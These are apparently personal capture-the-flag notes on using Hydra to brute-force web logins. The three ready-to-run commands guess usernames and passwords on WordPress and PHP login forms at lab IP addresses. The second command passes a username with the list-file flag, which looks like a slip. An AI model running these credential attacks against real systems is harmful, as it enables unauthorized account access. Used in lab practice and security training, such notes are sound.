# Hydra

Use [Hydra](https://github.com/vanhauser-thc/thc-hydra) to brute force a login page to find username:

```bash
hydra -L fsocity.dic -p pencer 10.10.175.84 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.175.84%2Fwp-admin%2F&testcookie=1:F=Invalid username"
```

Use Hydra to brute force password now we have a username:

```bash
hydra -L Elliot -P fsociety.dic 10.10.23.78 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.23.78%2Fwp-admin%2F&testcookie=1:S=302"
```

Another variation of brute forcing password:

```bash
hydra -t 64 -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!"
```

\
